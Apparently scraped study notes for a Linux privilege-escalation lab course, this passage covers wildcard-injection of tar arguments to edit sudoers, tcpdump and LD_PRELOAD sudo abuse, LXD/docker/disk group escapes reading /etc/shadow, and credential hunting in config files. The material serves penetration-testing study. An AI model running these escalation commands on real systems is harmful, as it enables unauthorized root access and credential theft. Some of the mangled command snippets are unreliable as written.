</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>root:x:0:
</span></span><span style=display:flex><span>daemon:x:1:
</span></span><span style=display:flex><span>bin:x:2:
</span></span><span style=display:flex><span>sys:x:3:
</span></span><span style=display:flex><span>adm:x:4:syslog,local-student
</span></span><span style=display:flex><span>tty:x:5:syslog
</span></span><span style=display:flex><span>disk:x:6:
</span></span><span style=display:flex><span>lp:x:7:
</span></span><span style=display:flex><span>mail:x:8:
</span></span><span style=display:flex><span>news:x:9:
</span></span><span style=display:flex><span>uucp:x:10:
</span></span><span style=display:flex><span>man:x:12:
</span></span><span style=display:flex><span>proxy:x:
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ getent group sudo
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>sudo:x:27:mrb3n
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=unmounted-file-systems>Unmounted File Systems</h4><p>Environment Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/fstab | grep -v &#34;#&#34; | column -t
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
</span></span><span style=display:flex><span>UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
</span></span><span style=display:flex><span>/swapfile                                  none       swap  sw
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=all-hidden-files>All Hidden Files</h4><p>Environment Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ find / -type f -name &#34;.*&#34; -exec ls -l {} \; 2&gt;/dev/null | grep local-student
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>-rw-r--r-- 1 local-student local-student 3771 Nov 27 11:16 /home/local-student/.bashrc
</span></span><span style=display:flex><span>-rw-rw-r-- 1 local-student local-student 180 Nov 27 11:36 /home/local-student/.wget-hsts
</span></span><span style=display:flex><span>-rw------- 1 local-student local-student 387 Nov 27 14:02 /home/local-student/.bash_history
</span></span><span style=display:flex><span>-rw-r--r-- 1 local-student local-student 807 Nov 27 11:16 /home/local-student/.profile
</span></span><span style=display:flex><span>-rw-r--r-- 1 local-student local-student 0 Nov 27 11:31 /home/local-student/.sudo_as_admin_successful
</span></span><span style=display:flex><span>-rw-r--r-- 1 local-student local-student 220 Nov 27 11:16 /home/local-student/.bash_logout
</span></span><span style=display:flex><span>-rw-rw-r-- 1 local-student local-student 162 Nov 28 13:26 /home/local-student/.notes
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ find / -type d -name &#34;.*&#34; -ls 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>   684822      4 drwx------   3 local-student local-student     4096 Nov 28 12:32 /home/local-student/.gnupg
</span></span><span style=display:flex><span>   790793      4 drwx------   2 local-student local-student     4096 Okt 27 11:31 /home/local-student/.ssh
</span></span><span style=display:flex><span>   684804      4 drwx------  10 local-student local-student     4096 Okt 27 11:30 /home/local-student/.cache
</span></span><span style=display:flex><span>   790827      4 drwxrwxr-x   8 local-student local-student     4096 Okt 27 11:32 /home/local-student/CVE-2021-3156/.git
</span></span><span style=display:flex><span>   684796      4 drwx------  10 local-student local-student     4096 Okt 27 11:30 /home/local-student/.config
</span></span><span style=display:flex><span>   655426      4 drwxr-xr-x   3 local-student local-student     4096 Okt 27 11:19 /home/local-student/.local
</span></span><span style=display:flex><span>   524808      4 drwxr-xr-x   7 gdm
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h5 id=cheat-sheet>Cheat Sheet</h5><p>The cheat sheet is a useful command reference for this module.</p><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>ssh local-student@&lt;target IP></code></td><td>SSH to lab target</td></tr><tr><td>`ps aux</td><td>grep root`</td></tr><tr><td><code>ps au</code></td><td>See logged in users</td></tr><tr><td><code>ls /home</code></td><td>View user home directories</td></tr><tr><td><code>ls -l ~/.ssh</code></td><td>Check for SSH keys for current user</td></tr><tr><td><code>history</code></td><td>Check the current user&rsquo;s Bash history</td></tr><tr><td><code>sudo -l</code></td><td>Can the user run anything as another user?</td></tr><tr><td><code>ls -la /etc/cron.daily</code></td><td>Check for daily Cron jobs</td></tr><tr><td><code>lsblk</code></td><td>Check for unmounted file systems/drives</td></tr><tr><td><code>find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null</code></td><td>Find world-writeable directories</td></tr><tr><td><code>find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null</code></td><td>Find world-writeable files</td></tr><tr><td><code>uname -a</code></td><td>Check the Kernel versiion</td></tr><tr><td><code>cat /etc/lsb-release</code></td><td>Check the OS version</td></tr><tr><td><code>gcc kernel_expoit.c -o kernel_expoit</code></td><td>Compile an exploit written in C</td></tr><tr><td><code>screen -v</code></td><td>Check the installed version of <code>Screen</code></td></tr><tr><td><code>./pspy64 -pf -i 1000</code></td><td>View running processes with <code>pspy</code></td></tr><tr><td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></td><td>Find binaries with the SUID bit set</td></tr><tr><td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null</code></td><td>Find binaries with the SETGID bit set</td></tr><tr><td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td><td>Priv esc with <code>tcpdump</code></td></tr><tr><td><code>echo $PATH</code></td><td>Check the current user&rsquo;s PATH variable contents</td></tr><tr><td><code>PATH=.:${PATH}</code></td><td>Add a <code>.</code> to the beginning of the current user&rsquo;s PATH</td></tr><tr><td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></td><td>Search for config files</td></tr><tr><td><code>ldd /bin/ls</code></td><td>View the shared objects required by a binary</td></tr><tr><td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td><td>Escalate privileges using <code>LD_PRELOAD</code></td></tr><tr><td>`readelf -d payroll</td><td>grep PATH`</td></tr><tr><td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td><td>Compiled a shared libary</td></tr><tr><td><code>lxd init</code></td><td>Start the LXD initialization process</td></tr><tr><td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td><td>Import a local image</td></tr><tr><td><code>lxc init alpine r00t -c security.privileged=true</code></td><td>Start a privileged LXD container</td></tr><tr><td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td><td>Mount the host file system in a container</td></tr><tr><td><code>lxc start r00t</code></td><td>Start the container</td></tr><tr><td><code>showmount -e 10.129.2.12</code></td><td>Show the NFS export list</td></tr><tr><td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td><td>Mount an NFS share locally</td></tr><tr><td><code>tmux -S /shareds new -s debugsess</code></td><td>Created a shared <code>tmux</code> session socket</td></tr><tr><td><code>./lynis audit system</code></td><td>Perform a system audit with <code>Lynis</code></td></tr></tbody></table><p>Â </p><p>Â </p><h4 id=installed-packages>Installed Packages</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ apt list --installed | tr &#34;/&#34; &#34; &#34; | cut -d&#34; &#34; -f1,3 | sed &#39;s/[0-9]://g&#39; | tee -a installed_pkgs.list
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Listing...                                                 
</span></span><span style=display:flex><span>accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
</span></span><span style=display:flex><span>accountsservice 0.6.55-0ubuntu12~20.04.5                   
</span></span><span style=display:flex><span>acl 2.2.53-6                                               
</span></span><span style=display:flex><span>acpi-support 0.143                                         
</span></span><span style=display:flex><span>acpid 2.0.32-1ubuntu1                                      
</span></span><span style=display:flex><span>adduser 3.118ubuntu2                                       
</span></span><span style=display:flex><span>adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
</span></span><span style=display:flex><span>alsa-base 1.0.25+dfsg-0ubuntu5                             
</span></span><span style=display:flex><span>alsa-topology-conf 1.2.2-1                                                                                            
</span></span><span style=display:flex><span>alsa-ucm-conf 1.2.2-1ubuntu0.13                            
</span></span><span style=display:flex><span>alsa-utils 1.2.2-1ubuntu2.1                                                                                           
</span></span><span style=display:flex><span>amd64-microcode 3.20191218.1ubuntu1
</span></span><span style=display:flex><span>anacron 2.3-29
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=credential-hunting>Credential Hunting</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ cat wp-config.php | grep &#39;DB_USER|DB_PASSWORD&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );
</span></span><span style=display:flex><span>define( &#39;DB_PASSWORD&#39;, &#39;WPadmin123!&#39; );
</span></span></code></pre></div><p>The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).</p><p>Credential Hunting</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$  find / ! -path &#34;*/proc/*&#34; -iname &#34;*config*&#34; -type f 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/etc/ssh/ssh_config
</span></span><span style=display:flex><span>/etc/ssh/sshd_config
</span></span><span style=display:flex><span>/etc/python3/debian_config
</span></span><span style=display:flex><span>/etc/kbd/config
</span></span><span style=display:flex><span>/etc/manpath.config
</span></span><span style=display:flex><span>/boot/config-4.4.0-116-generic
</span></span><span style=display:flex><span>/boot/grub/i386-pc/configfile.mod
</span></span><span style=display:flex><span>/sys/devices/pci0000:00/0000:00:00.0/config
</span></span><span style=display:flex><span>/sys/devices/pci0000:00/0000:00:01.0/config
</span></span><span style=display:flex><span>&lt;SNIP&gt;
</span></span></code></pre></div><hr><h2 id=ssh-keys>SSH Keys</h2><p>It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the <code>known_hosts</code> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.</p><p>Credential Hunting</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$  ls ~/.ssh
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>id_rsa  id_rsa.pub  known_hosts
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=path-abuse>Path Abuse</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ echo $PATH
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</span></span></code></pre></div><p>Path Abuse</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ PATH=.:${PATH}
</span></span><span style=display:flex><span>local_student@NIX02:~$ export PATH
</span></span><span style=display:flex><span>local_student@NIX02:~$ echo $PATH
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=wildcard-abuse>Wildcard Abuse</h1><p>Â </p><p>Consider the following cron job, which is set up to back up the <code>/home/local-student</code> directory&rsquo;s contents and create a compressed archive within <code>/home/local-student</code>. The cron job is set to run every minute, so it is a good candidate for privilege escalation.</p><p>Wildcard Abuse</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>#
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>mh dom mon dow command
</span></span><span style=display:flex><span>*/01 * * * * cd /home/local-student &amp;&amp; tar -zcf /home/local-student/backup.tar.gz *
</span></span></code></pre></div><p>We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.</p><p>Wildcard Abuse</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local-student@NIX02:~$ echo &#39;echo &#34;local-student ALL=(root) NOPASSWD: ALL&#34; &gt;&gt; /etc/sudoers&#39; &gt; root.sh
</span></span><span style=display:flex><span>local-student@NIX02:~$ echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=sh root.sh&#34;
</span></span><span style=display:flex><span>local-student@NIX02:~$ echo &#34;&#34; &gt; --checkpoint=1
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=escaping-restricted-shells>Escaping Restricted Shells</h1><p>Â </p><h3 id=2-command-substitution>2ï¸âƒ£ <strong>Command Substitution</strong></h3><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ls -l `pwd`
</span></span></code></pre></div><p>Â </p><p>Â </p><h3 id=3-command-chaining>3ï¸âƒ£ <strong>Command Chaining</strong></h3><p>Use shell metacharacters to chain commands:</p><p>bash</p><p>CopyEdit</p><p><code>ls -l ; id</code></p><ul><li>The semicolon <code>;</code> allows execution of <code>id</code> after <code>ls</code>.</li></ul><p>Other chaining operators:</p><table><thead><tr><th>Operator</th><th>Meaning</th></tr></thead><tbody><tr><td><code>;</code></td><td>Run multiple commands sequentially</td></tr><tr><td><code>&&</code></td><td>Run second command only if first succeeds</td></tr><tr><td><code></code></td><td></td></tr><tr><td><code></code></td><td><code></code></td></tr></tbody></table><hr><h3 id=4-environment-variables-abuse>4ï¸âƒ£ <strong>Environment Variables Abuse</strong></h3><p>Â </p><h3 id=4-environment-variables-abuse-1>4ï¸âƒ£ <strong>Environment Variables Abuse</strong></h3><p>Modify environment variables to bypass restrictions.</p><p>Example: If the restricted shell uses a specific PATH:</p><p>bash</p><p>CopyEdit</p><p><code>PATH=/your/path:$PATHexport PATH</code></p><ul><li>Insert malicious binaries or scripts earlier in PATH.</li></ul><hr><h3 id=5-shell-functions>5ï¸âƒ£ <strong>Shell Functions</strong></h3><p>Define functions that wrap restricted commands with additional commands.</p><p>Example:</p><p>bash</p><p>CopyEdit</p><p><code>function ls() { /bin/ls; /bin/bash; }</code></p><ul><li>Calling <code>ls</code> triggers both <code>ls</code> and spawns an unrestricted shell.</li></ul><hr><h2 id=summary>Summary</h2><p>âœ… Always test:</p><ul><li><p>Command injection (<code>$( )</code>, backticks)</p></li><li><p>Chaining (<code>;</code>, <code>&&</code>, <code>||</code>)</p></li><li><p>Environment variable manipulation</p></li><li><p>Shell function redefinitions</p></li></ul><p>âœ… Restricted shells are often poorly implemented and easy to bypass with creativity.</p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=-linux-special-permissions-setuid-setgid-and-gtfobins>ğŸ“Œ Linux Special Permissions: <code>setuid</code>, <code>setgid</code>, and GTFOBins</h1><hr><h2 id=-concept-explanation>ğŸ” Concept Explanation</h2><h3 id=set-user-id-setuid><strong>Set User ID (setuid)</strong></h3><ul><li><p>Allows a user to execute a file with the <strong>file owner&rsquo;s privileges</strong>.</p></li><li><p>Typically used to temporarily grant <strong>root privileges</strong> for certain binaries.</p></li><li><p>When set, the file permissions show <code>s</code> for the owner execute bit (<code>rws</code>).</p></li><li><p>Exploitable if:</p><ul><li><p>The binary has unintended features.</p></li><li><p>The binary can be abused to execute arbitrary code.</p></li></ul></li></ul><h3 id=set-group-id-setgid><strong>Set Group ID (setgid)</strong></h3><ul><li><p>Similar to <code>setuid</code>, but applies to <strong>group ownership</strong>.</p></li><li><p>Executes the file as if you are part of the group that owns the file.</p></li><li><p>Permissions show <code>s</code> for the group execute bit (<code>rwsr-sr-x</code>).</p></li></ul><hr><h2 id=-suid-enumeration-commands>ğŸ’» SUID Enumeration Commands</h2><p>bash</p><p>CopyEdit</p><p><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></p><blockquote><p>find / -perm -u=s -type f 2>/dev/null</p></blockquote><p><strong>Syntax Explanation:</strong></p><ul><li><p><code>/</code> : Search entire filesystem.</p></li><li><p><code>-user root</code> : Owned by root.</p></li><li><p><code>-perm -4000</code> : Files with SUID set.</p></li><li><p><code>-exec ls -ldb {} \;</code> : List full details of found files.</p></li><li><p><code>2>/dev/null</code> : Suppress permission denied errors.</p></li></ul><h3 id=-example-output>ğŸ”¬ Example Output</h3><p>swift</p><p>CopyEdit</p><p><code>-rwsr-xr-x 1 root root 16728 /home/local-student/shared_obj_hijack/payroll-rwsr-xr-x 1 root root 40152 /bin/mount-rwsr-xr-x 1 root root 54256 /usr/bin/passwd...</code></p><hr><h2 id=-sgid-enumeration-commands>ğŸ’» SGID Enumeration Commands</h2><p>bash</p><p>CopyEdit</p><p><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null</code></p><p><strong>Syntax Explanation:</strong></p><ul><li><p><code>-perm -6000</code> : Search for both setuid (4000) and setgid (2000) files together.</p></li><li><p>Rest is same as above.</p></li></ul><h3 id=-example-output-1>ğŸ”¬ Example Output</h3><p>swift</p><p>CopyEdit</p><p><code>-rwsr-sr-x 1 root root 85832 /usr/lib/snapd/snap-confine</code></p><hr><h2 id=-privilege-escalation-via-suidsgid>ğŸ›¡ Privilege Escalation via SUID/SGID</h2><ul><li><p>Reverse engineer custom binaries (e.g., <code>payroll</code>, <code>netracer</code>) for vulnerabilities.</p></li><li><p>Many default system binaries are safe (e.g., <code>passwd</code>, <code>su</code>), but check for version-specific exploits.</p></li><li><p>Combine with <strong>GTFOBins</strong> to check for abuse opportunities.</p></li></ul><hr><h2 id=-gtfobins>ğŸ“Œ GTFOBins</h2><ul><li><p>Curated database of Linux binaries that can be exploited for:</p><ul><li><p>Privilege Escalation</p></li><li><p>Restricted shell escape</p></li><li><p>Reverse shells</p></li><li><p>File transfers</p></li></ul></li></ul><p><strong>Website:</strong><br><a href=https://gtfobins.github.io rel=external>https://gtfobins.github.io</a></p><hr><h2 id=-gtfobins-sudo-example-apt-get>ğŸ’» GTFOBins Sudo Example (<code>apt-get</code>)</h2><p>bash</p><p>CopyEdit</p><p><code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></p><p><strong>Syntax Explanation:</strong></p><ul><li><p><code>sudo</code> : Run as root.</p></li><li><p><code>apt-get update</code> : Executes update.</p></li><li><p><code>-o APT::Update::Pre-Invoke::=/bin/sh</code> : Before running update, execute <code>/bin/sh</code> as root.</p></li></ul><h3 id=-output-example>ğŸ”¬ Output Example</h3><p>bash</p><p>CopyEdit</p><p><code># iduid=0(root) gid=0(root) groups=0(root)</code></p><hr><h2 id=-notes>âš  Notes</h2><ul><li><p>Always manually review unusual SUID/SGID binaries.</p></li><li><p>GTFOBins is extremely helpful for live exam scenarios.</p></li><li><p>Memorize common binaries: <code>vim</code>, <code>less</code>, <code>nano</code>, <code>awk</code>, <code>perl</code>, <code>python</code>, <code>tar</code>, <code>find</code>, <code>cp</code>, <code>rsync</code>, etc.</p></li></ul><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=sudo-rights-abuse>Sudo Rights Abuse</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Matching Defaults entries for sysadm on NIX02:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>User sysadm may run the following commands on NIX02:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/sbin/tcpdump
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>local_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>dropped privs to root
</span></span><span style=display:flex><span>tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
</span></span><span style=display:flex><span>Maximum file limit reached: 1
</span></span><span style=display:flex><span>1 packet captured
</span></span><span style=display:flex><span>6 packets received by filter
</span></span><span style=display:flex><span>compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
</span></span><span style=display:flex><span>0 packets dropped by kernel
</span></span></code></pre></div><p>Â </p><p><a href=#R-image-716aaeb1d1e29046aaf275b7497cbd57 class=lightbox-link><img alt=4d00853b5c12c0909b93db54c5e683f5.png class="lazy lightbox figure-image" loading=lazy src=../../resources/4d00853b5c12c0909b93db54c5e683f5.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-716aaeb1d1e29046aaf275b7497cbd57><img alt=4d00853b5c12c0909b93db54c5e683f5.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/4d00853b5c12c0909b93db54c5e683f5.png></a></p><p>Â </p><p>Â </p><p>Â </p><h1 id=-privileged-groups-exploitation-oscp>ğŸ“Œ Privileged Groups Exploitation (OSCP)</h1><hr><h2 id=-concept-explanation-1>ğŸ” Concept Explanation</h2><ul><li><p>Certain Linux groups grant indirect root-like privileges.</p></li><li><p>If user is a member of these groups, they may escalate privileges using group-specific capabilities.</p></li><li><p>Always check group memberships using:</p></li></ul><p>bash</p><p>CopyEdit</p><p><code>id</code></p><p>Example:</p><p>bash</p><p>CopyEdit</p><p><code>devops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)</code></p><hr><h2 id=-group-lxd-linux-containers>ğŸ”§ Group: <code>lxd</code> (Linux Containers)</h2><h3 id=-why-dangerous>ğŸ” Why dangerous</h3><ul><li><p><code>lxd</code> allows managing containers.</p></li><li><p>Member can create <strong>privileged containers</strong> which map container root â†’ host root.</p></li></ul><hr><h3 id=-exploitation-steps>ğŸ’» Exploitation Steps</h3><h4 id=1-extract-the-lxd-image>1ï¸âƒ£ Extract the LXD image:</h4><p>bash</p><p>CopyEdit</p><p><code>unzip alpine.zipcd 64-bit\ Alpine/</code></p><h4 id=2-initialize-lxd-use-defaults>2ï¸âƒ£ Initialize LXD (use defaults):</h4><p>bash</p><p>CopyEdit</p><p><code>lxd init</code></p><p>Example answers:</p><ul><li><p>Storage backend: dir</p></li><li><p>Network: no</p></li><li><p>LXD bridge: yes</p></li></ul><h4 id=3-import-image>3ï¸âƒ£ Import image:</h4><p>bash</p><p>CopyEdit</p><p><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></p><h4 id=4-create-privileged-container>4ï¸âƒ£ Create privileged container:</h4><p>bash</p><p>CopyEdit</p><p><code>lxc init alpine r00t -c security.privileged=true</code></p><h4 id=5-mount-host-file-system-inside-container>5ï¸âƒ£ Mount host file system inside container:</h4><p>bash</p><p>CopyEdit</p><p><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></p><h4 id=6-start-container>6ï¸âƒ£ Start container:</h4><p>bash</p><p>CopyEdit</p><p><code>lxc start r00t</code></p><h4 id=7-spawn-shell-inside-container>7ï¸âƒ£ Spawn shell inside container:</h4><p>bash</p><p>CopyEdit</p><p><code>lxc exec r00t /bin/sh</code></p><h4 id=8-verify-root-access>8ï¸âƒ£ Verify root access:</h4><p>bash</p><p>CopyEdit</p><p><code>iduid=0(root) gid=0(root)</code></p><h4 id=-example-access-host-root-file-system>ğŸ” Example: access host root file system:</h4><p>bash</p><p>CopyEdit</p><p><code>cd /mnt/root/rootcat /mnt/root/etc/shadow</code></p><hr><h2 id=-group-docker>ğŸ”§ Group: <code>docker</code></h2><h3 id=-why-dangerous-1>ğŸ” Why dangerous</h3><ul><li><p>Full filesystem access via container volumes.</p></li><li><p>Docker containers can mount host directories, exposing root files.</p></li></ul><h3 id=-exploitation-example>ğŸ’» Exploitation Example</h3><p>bash</p><p>CopyEdit</p><p><code>docker run -v /root:/mnt -it ubuntu /bin/bash</code></p><h4 id=explanation>Explanation:</h4><ul><li><p><code>-v /root:/mnt</code> â†’ Mount host <code>/root</code> dir inside container.</p></li><li><p>Inside container:</p></li></ul><p>bash</p><p>CopyEdit</p><p><code>cd /mntcat .ssh/authorized_keys</code></p><ul><li>Same technique can be used to access <code>/etc/shadow</code> for password hashes.</li></ul><hr><h2 id=-group-disk>ğŸ”§ Group: <code>disk</code></h2><h3 id=-why-dangerous-2>ğŸ” Why dangerous</h3><ul><li><p>Full access to block devices under <code>/dev</code> (e.g. <code>/dev/sda1</code>).</p></li><li><p>Entire file system can be read directly.</p></li></ul><h3 id=-exploitation-example-using-debugfs>ğŸ’» Exploitation Example (using debugfs):</h3><p>bash</p><p>CopyEdit</p><p><code>sudo debugfs /dev/sda1</code></p><h4 id=inside-debugfs>Inside debugfs:</h4><p>bash</p><p>CopyEdit</p><p><code>lscd /rootcat .ssh/authorized_keys</code></p><ul><li>Can retrieve sensitive files or add SSH keys.</li></ul><hr><h2 id=-group-adm>ğŸ”§ Group: <code>adm</code></h2><h3 id=-why-dangerous-3>ğŸ” Why dangerous</h3><ul><li><p>Can read system logs in <code>/var/log</code>.</p></li><li><p>Can expose:</p><ul><li><p>Credentials accidentally logged.</p></li><li><p>Running cron jobs.</p></li><li><p>Command history.</p></li><li><p>Application errors with sensitive data.</p></li></ul></li></ul><h3 id=-exploitation-example-1>ğŸ’» Exploitation Example</h3><p>bash</p><p>CopyEdit</p><p><code>cd /var/logcat auth.logcat mysql/error.logcat cron.log</code></p><hr><h2 id=-key-oscp-takeaway>ğŸ” Key OSCP Takeaway</h2><h2 id=always-check-group-memberships--lxd-docker-disk-and-adm-may-allow-privilege-escalation-even-without-full-sudo-access>Always check group memberships â€” <code>lxd</code>, <code>docker</code>, <code>disk</code>, and <code>adm</code> may allow privilege escalation even without full sudo access.</h2><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=-linux-capabilities-exploitation-oscp>ğŸ“Œ Linux Capabilities Exploitation (OSCP)</h1><hr><h2 id=-concept-explanation-2>ğŸ” Concept Explanation</h2><ul><li><p>Linux capabilities break the all-or-nothing root privilege model.</p></li><li><p>Capabilities allow assigning specific privileges to binaries.</p></li><li><p>Binaries can perform restricted actions without full root permissions.</p></li><li><p>If misused, capabilities can lead to privilege 